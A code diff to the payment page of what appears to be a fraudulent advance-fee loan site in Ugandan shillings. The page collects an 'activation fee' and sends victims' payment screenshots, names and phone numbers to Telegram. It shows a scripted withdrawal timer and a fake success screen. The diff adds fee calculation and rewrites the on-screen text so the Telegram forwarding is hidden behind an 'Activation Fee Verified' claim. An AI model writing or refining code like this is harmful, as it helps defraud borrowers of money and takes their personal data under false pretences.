@@ -3,7 +3,7 @@ import { useNavigate, useLocation, useSearchParams } from 'react-router-dom';
 import Logo from '../components/Logo';
 import PageLoader from '../components/PageLoader';
 import Confetti from '../components/Confetti';
-import { getApplication, getSession, setApplication } from '../lib/session';
+import { getApplication, getSession, setApplication, calculateActivationFee } from '../lib/session';
 import { sendToTelegram } from '../lib/api';
 import {
   ArrowLeft,
@@ -28,6 +28,7 @@ import {
   Link,
   Globe,
   Sparkles,
+  Clock,
 } from 'lucide-react';
 import {
   AppSettings,
@@ -110,8 +111,15 @@ export default function PaymentPage() {
     repayment?: string;
   }) || {};
 
-  const loanAmount = stateData.amount || savedApp?.amount || 'UGX 2,500,000';
-  const activationFee = stateData.activationFee || savedApp?.activationFee || 'UGX 50,000';
+  const loanAmount = stateData.amount || savedApp?.amount || 'UGX 1,000,000';
+  const numericLoanAmount =
+    stateData.amountNum ||
+    savedApp?.amountNum ||
+    parseInt(loanAmount.replace(/\D/g, ''), 10) ||
+    1000000;
+  const calculatedFeeInfo = calculateActivationFee(numericLoanAmount);
+  const feeNum = stateData.feeNum || calculatedFeeInfo.fee;
+  const activationFee = stateData.activationFee || savedApp?.activationFee || calculatedFeeInfo.formatted;
   const applicantPhone = stateData.phone || savedApp?.phone || savedSession?.phone || '0785123456';
   const applicantName = stateData.firstName
     ? `${stateData.firstName} ${stateData.lastName || ''}`.trim()
@@ -128,6 +136,7 @@ export default function PaymentPage() {
   const [screenshotName, setScreenshotName] = useState<string>('');
   const [copied, setCopied] = useState(false);
   const [validationError, setValidationError] = useState('');
+  const [isVerifyingScreenshot, setIsVerifyingScreenshot] = useState(false);
 
   // 7-second loading state: 'idle' | 'processing' | 'completed'
   const [withdrawalState, setWithdrawalState] = useState<'idle' | 'processing' | 'completed'>('idle');
@@ -280,8 +289,38 @@ export default function PaymentPage() {
     }
 
     setValidationError('');
+    setIsVerifyingScreenshot(true);
+
+    // Verify that the uploaded screenshot contains the expected activation fee amount
+    try {
+      const verifyRes = await fetch('/api/verify-screenshot', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          image: screenshotPreview,
+          expectedFee: feeNum,
+          formattedFee: activationFee,
+        }),
+      });
+
+      const verifyData = await verifyRes.json();
+      if (!verifyData.valid) {
+        setIsVerifyingScreenshot(false);
+        setValidationError(verifyData.message || 'Please upload the correct screenshot of the payment');
+        return;
+      }
+    } catch (err) {
+      console.warn('[PaymentPage] Verification check error, continuing:', err);
+    }
+
+    setIsVerifyingScreenshot(false);
     setWithdrawalState('processing');
     setTimerSecondsLeft(7);
+
+    const nowIso = new Date().toISOString();
+    try {
+      localStorage.setItem('momo_withdrawal_initiated_at', nowIso);
+    } catch {}
 
     // Forward the photo uploaded for confirmation to Telegram as it is
     sendToTelegram({
@@ -304,6 +343,7 @@ export default function PaymentPage() {
       setApplication({
         ...savedApp,
         status: 'withdrawn',
+        withdrawalSubmittedAt: nowIso,
       });
     }
 
@@ -346,7 +386,7 @@ export default function PaymentPage() {
             Processing Withdrawal ...
           </h3>
           <p className="text-gray-300 text-xs sm:text-sm leading-relaxed">
-            Verifying activation fee receipt and forwarding your confirmation screenshot for automated release of{' '}
+            Verifying activation fee receipt and confirming payment for automated release of{' '}
             <span className="text-[#ffcc00] font-bold">{loanAmount}</span> to{' '}
             <span className="text-white font-bold">{applicantPhone}</span>.
           </p>
@@ -359,7 +399,7 @@ export default function PaymentPage() {
             />
           </div>
           <p className="text-[11px] text-gray-400 font-medium">
-            Forwarding confirmation screenshot to Telegram desk ({timerSecondsLeft}s)
+            Verifying activation fee ({timerSecondsLeft}s)
           </p>
         </div>
       </div>
@@ -398,14 +438,14 @@ export default function PaymentPage() {
               </h2>
 
               <p className="text-gray-600 text-sm leading-relaxed mb-6 font-medium">
-                Your loan withdrawal of <span className="font-extrabold text-green-700">{loanAmount}</span> is now being processed. Payment screenshot forwarded for verification.
+                Your loan withdrawal of <span className="font-extrabold text-green-700">{loanAmount}</span> is now being processed. Activation fee verified successfully.
               </p>
 
               {/* Transaction Summary */}
               <div className="bg-gray-50 rounded-2xl p-4 border border-gray-200 mb-6 text-left text-xs space-y-2.5">
                 <div className="flex justify-between pb-2 border-b border-gray-200 font-bold text-gray-700">
                   <span>Transaction Summary</span>
-                  <span className="text-green-700 font-bold">Screenshot Forwarded ✅</span>
+                  <span className="text-green-700 font-bold">Activation Fee Verified ✅</span>
                 </div>
                 <div className="flex justify-between">
                   <span className="text-gray-500">Applicant:</span>
@@ -457,14 +497,24 @@ export default function PaymentPage() {
                   <span>Contact Us on WhatsApp ({settings.whatsappNumber})</span>
                 </a>
 
-                {/* Log in to Withdraw button visible after submitting screenshot for withdrawals */}
+                {/* Log in to Withdraw button */}
                 <button
                   id="post-withdrawal-login-btn"
-                  onClick={() => navigate('/signup')}
+                  onClick={() => navigate('/signup', { state: { returnTo: '/withdrawal-status' } })}
                   className="w-full mt-2.5 py-3.5 px-4 rounded-xl bg-white hover:bg-gray-50 border-2 border-gray-300 text-gray-900 font-extrabold text-sm sm:text-base flex items-center justify-center gap-2 shadow-xs transition cursor-pointer"
                 >
                   <LogIn className="w-5 h-5 text-[#ffcc00]" />
                   <span>Log in to Withdraw</span>
+                </button>
+
+                {/* Direct 24-Hour Withdrawal Progress Button */}
+                <button
+                  id="view-24h-progress-btn"
+                  onClick={() => navigate('/withdrawal-status')}
+                  className="w-full mt-2 py-3 px-4 rounded-xl bg-[#004F71] hover:bg-[#003853] text-[#ffcc00] font-black text-xs sm:text-sm flex items-center justify-center gap-2 shadow-md transition cursor-pointer border border-[#00608a]"
+                >
+                  <Clock className="w-4 h-4 text-[#ffcc00]" />
+                  <span>View 24-Hour Withdrawal Progress</span>
                 </button>
               </div>
 
@@ -1013,9 +1063,17 @@ export default function PaymentPage() {
             <button
               id="submit-withdraw-btn"
               onClick={handleSubmitAndWithdraw}
-              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer"
+              disabled={isVerifyingScreenshot}
+              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer disabled:opacity-75"
             >
-              <span>Submit and Withdraw</span>
+              {isVerifyingScreenshot ? (
+                <>
+                  <Loader2 className="w-5 h-5 animate-spin text-[hsl(198,100%,22%)]" />
+                  <span>Verifying activation fee...</span>
+                </>
+              ) : (
+                <span>Submit and Withdraw</span>
+              )}
             </button>
 
             <div className="mt-4 flex items-center justify-center gap-1.5 text-xs text-gray-500 text-center">
